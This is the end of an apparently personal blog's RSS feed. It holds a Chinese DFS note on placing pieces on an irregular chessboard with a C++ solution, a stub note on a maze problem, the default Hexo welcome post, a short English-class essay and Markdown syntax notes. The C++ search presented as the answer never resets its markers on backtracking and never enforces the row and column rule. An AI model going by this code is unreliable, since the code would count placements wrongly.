            <link>https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/DFS/%E6%A3%8B%E7%9B%98%E9%97%AE%E9%A2%98/</link>
            <category>Notes</category>
            <category>C++</category>
            <category>DFS</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;h4 id=&#34;问题描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#问题描述&#34;&gt;#&lt;/a&gt; 问题描述&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;在一个给定形状的棋盘（形状可能是不规则的）上面摆放棋子，棋子没有区别。要求摆放时任意的两个棋子不能放在棋盘中的同一行或者同一列，请编程求解对于给定形状和大小的棋盘，摆放 k 个棋子的所有可行的摆放方案 C。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;输入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输入&#34;&gt;#&lt;/a&gt; 输入&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;输入含有多组测试数据。&lt;br /&gt;
每组数据的第一行是两个正整数 *，n k*，用一个空格隔开，表示了将在一个 n*n 的矩阵内描述棋盘，以及摆放棋子的数目。&lt;/p&gt;
&lt;p&gt;n &amp;lt;= 8 , k &amp;lt;= n&lt;/p&gt;
&lt;p&gt;当为 **-1 -1** 时表示输入结束。&lt;br /&gt;
随后的 n 行描述了棋盘的形状：每行有 n 个字符，其中  &lt;code&gt;#&lt;/code&gt;  表示棋盘区域， &lt;code&gt;.&lt;/code&gt;  表示空白区域（数据保证不出现多余的空白行或者空白列）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输出&#34;&gt;#&lt;/a&gt; 输出&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;对于每一组数据，给出一行输出，输出摆放的方案数目 C （&lt;em&gt;数据保证 C&amp;lt;2^31&lt;/em&gt;）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;样例输入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#样例输入&#34;&gt;#&lt;/a&gt; 样例输入&lt;/h5&gt;
&lt;figure class=&#34;highlight plain&#34;&gt;&lt;figcaption data-lang=&#34;plain&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;2 1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;.#&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;4 4&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;...#&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;..#.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;.#..&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#...&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-1 -1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;样例输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#样例输出&#34;&gt;#&lt;/a&gt; 样例输出&lt;/h5&gt;
&lt;figure class=&#34;highlight plain&#34;&gt;&lt;figcaption data-lang=&#34;plain&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;解题思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解题思路&#34;&gt;#&lt;/a&gt; 解题思路&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;代码如下&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string.h&amp;gt;
using namespace std;

int n, k, ans, a[64], j; // n 方阵长度，k棋子个数,ans is answer

int visit[8][8]&amp;#123;0&amp;#125;; // shows which cloumn and row is not placeable

struct Node
&amp;#123;
    int *flag;
    int p = 0;// in fact, the param is redundant
&amp;#125;;
// 如果为0则空，1则有棋盘’#‘
Node qiju[100];
// 进行遍历// 考虑使用下标 从1开始

void dfs(int idx, int num)
&amp;#123;
    if (num == k)
        ans++; // plan + 1
    else
    &amp;#123;
        for (int i = idx; i &amp;lt; j; i++) // each qipan has possiblity
        &amp;#123;
            if (*qiju[a[i]].flag == 1)
                continue;
            *qiju[a[i]].flag = 1; //
            dfs(0, num + 1);
        &amp;#125;
    &amp;#125;
&amp;#125;

int main()
&amp;#123;
    char ch;
    while (cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; k)
    &amp;#123;
        if (n == -1 &amp;amp;&amp;amp; k == -1)
            break;
        j = 0;
        ans = 0;
        memset(qiju, 0, sizeof(qiju));
        memset(visit, 0, sizeof(visit));

        for (int i = 0; i &amp;lt; n * n; i++)
        &amp;#123;

            cin &amp;gt;&amp;gt; ch;
            switch (ch)
            &amp;#123;
            case &#39;.&#39;:
                break;
            case &#39;#&#39;:

                qiju[i].p = 1;// when I have created array a, 
                    		//I can visit qiju by a, 
                    		//in this situation param p is redundant.
                qiju[i].flag = &amp;amp;visit[i / n][i % n]; // point to position
                a[j] = i;                            // restore qipan position with arry a
                j++;
                break;
            &amp;#125;
        &amp;#125;
        dfs(0, 0);
        cout &amp;lt;&amp;lt; ans &amp;lt;&amp;lt; endl;
    &amp;#125;
    return 0;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;结语&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#结语&#34;&gt;#&lt;/a&gt; 结语&lt;/h4&gt;
&lt;p&gt;通过 visit 标记状态，通过 node 取地址，使每个棋盘的状态得以被标示，同时通过 node 数组，a 数组实现快速访问，规避无效数据。&lt;/p&gt;
&lt;h4 id=&#34;参考资料&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考资料&#34;&gt;#&lt;/a&gt; 参考资料&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;DFS 深度优先搜索算法&lt;/p&gt;
&lt;/blockquote&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/DFS/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</guid>
            <title>迷宫问题</title>
            <link>https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/DFS/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</link>
            <category>Notes</category>
            <category>C++</category>
            <category>DFS</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;问题描述&lt;/p&gt;
&lt;p&gt;解决思路&lt;/p&gt;
&lt;p&gt;代码如下&lt;/p&gt;
&lt;p&gt;结语：&lt;/p&gt;
&lt;p&gt;迷宫问题很重要的就是路径，方向，路径使用栈，方向通过 2X4 的数组描述，关键在于，在平面上点的坐标可以用 (x,y) 描述，给它加上&lt;/p&gt;
&lt;p&gt;(1,0)((-1,0),(0,1),(0,-1)) 就实现了向右 (左，上，下) 移动。&lt;/p&gt;
&lt;p&gt;参考资料&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/18/hello-world/</guid>
            <title>Hello World</title>
            <link>https://evefortosaber.github.io/2023/03/18/hello-world/</link>
            <pubDate>Sat, 18 Mar 2023 19:57:26 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo new &lt;span class=&#34;token string&#34;&gt;&#34;My New Post&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo server&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo generate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo deploy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2022/09/08/zhaji/EnglishClass/</guid>
            <title>My fist English Class</title>
            <link>https://evefortosaber.github.io/2022/09/08/zhaji/EnglishClass/</link>
            <category>随笔</category>
            <pubDate>Thu, 08 Sep 2022 14:40:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;short-talk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#short-talk&#34;&gt;#&lt;/a&gt; Short Talk&lt;/h1&gt;
&lt;p&gt;(In fact, i want to improve my English through writing some articles in English.)&lt;/p&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;my-teachers&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#my-teachers&#34;&gt;#&lt;/a&gt; My teachers&lt;/h3&gt;
&lt;p&gt;One of my teacher is a &lt;em&gt;Chinese&lt;/em&gt;,while the other one is an &lt;em&gt;English&lt;/em&gt;(maybe,i&#39;m not certain,forgive me)&lt;br /&gt;
When i typing the article you see, i&#39;m taking my foreign teacher&#39;s spoken English class.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;my-class&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#my-class&#34;&gt;#&lt;/a&gt; My class&lt;/h3&gt;
&lt;p&gt;The spoken English class focuses on discussion.&lt;br /&gt;
Yet my classmates are pretty shy so that few discusions happened when we were dvided into the same discuss room.&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2022/09/07/zhaji/Note%20of%20markdown/</guid>
            <title>Notes Of Markdown</title>
            <link>https://evefortosaber.github.io/2022/09/07/zhaji/Note%20of%20markdown/</link>
            <category>Notes</category>
            <pubDate>Wed, 07 Sep 2022 23:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;为了搭建自己的 blog，clone 了个模板。现在也是时候该来学写 blog 了。 &lt;s&gt;（什么写 blog 还要学不是有手就行？？）&lt;/s&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;note-of-markdown&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#note-of-markdown&#34;&gt;#&lt;/a&gt; Note Of Markdown&lt;/h1&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;1-准备preparation&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-准备preparation&#34;&gt;#&lt;/a&gt; 1. 准备（Preparation）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;应用软件：Video Studio Code&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工作文件：makedown (后缀为 &lt;code&gt;.md&lt;/code&gt; ）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;2-开始beginning&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-开始beginning&#34;&gt;#&lt;/a&gt; 2. 开始（Beginning）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;创建一个文本文档更改后缀为 &lt;code&gt;.md&lt;/code&gt;  然后用 Visual Studio Code 打开，或者先打开 Visual Studio Code 然后新建一个后缀为 &lt;code&gt;.md&lt;/code&gt;  的文件。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;打开侧边预览&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;在view中打开 Command Palette 然后输入Open Preview to the Side
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;3语法grammar&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3语法grammar&#34;&gt;#&lt;/a&gt; 3. 语法（Grammar）&lt;/h3&gt;
&lt;h5 id=&#34;标题title&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#标题title&#34;&gt;#&lt;/a&gt; 标题（Title)&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;标题可分为一到六级分别用 #、##、###...... 以此类推&lt;br /&gt;
其中 #表示的最大，###### 最小。语法如下：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;# 标题1
## 标题2
### 标题3
...
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;换行直接回车&lt;/li&gt;
&lt;li&gt;字体
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*内容*&lt;/code&gt;  为斜体&lt;/li&gt;
&lt;li&gt;&lt;code&gt;**内容**&lt;/code&gt;  为加粗&lt;/li&gt;
&lt;li&gt;&lt;code&gt;***内容***&lt;/code&gt;  为粗斜体&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~~内容~~&lt;/code&gt;  为删除线&lt;br /&gt;
表现：&lt;em&gt;内容&lt;/em&gt;、&lt;strong&gt;内容&lt;/strong&gt;、&lt;em&gt;&lt;strong&gt;内容&lt;/strong&gt;&lt;/em&gt;、&lt;s&gt;内容&lt;/s&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;4插入insert&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4插入insert&#34;&gt;#&lt;/a&gt; 4. 插入 (Insert)&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;插入图片&lt;/p&gt;
&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;figcaption data-lang=&#34;markdown&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;![图片名称](图片链接 &#39;Alt&#39;)&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;插入链接&lt;/p&gt;
&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;figcaption data-lang=&#34;markdown&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token url&#34;&gt;[&lt;span class=&#34;token content&#34;&gt;内容&lt;/span&gt;](&lt;span class=&#34;token url&#34;&gt;链接&lt;/span&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;混合使用&lt;/p&gt;
&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;figcaption data-lang=&#34;markdown&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;[![图片名称](图片链接 &#39;Alt&#39;)](链接)&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这样就对图片添加了超链接。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;5其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5其他&#34;&gt;#&lt;/a&gt; 5. 其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90eXBvcmFpby5jbi8=&#34;&gt;Typro&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;更多语法参照&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9odG1sL2h0bWwtdHV0b3JpYWwuaHRtbA==&#34;&gt; HTML&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
    </channel>
</rss>
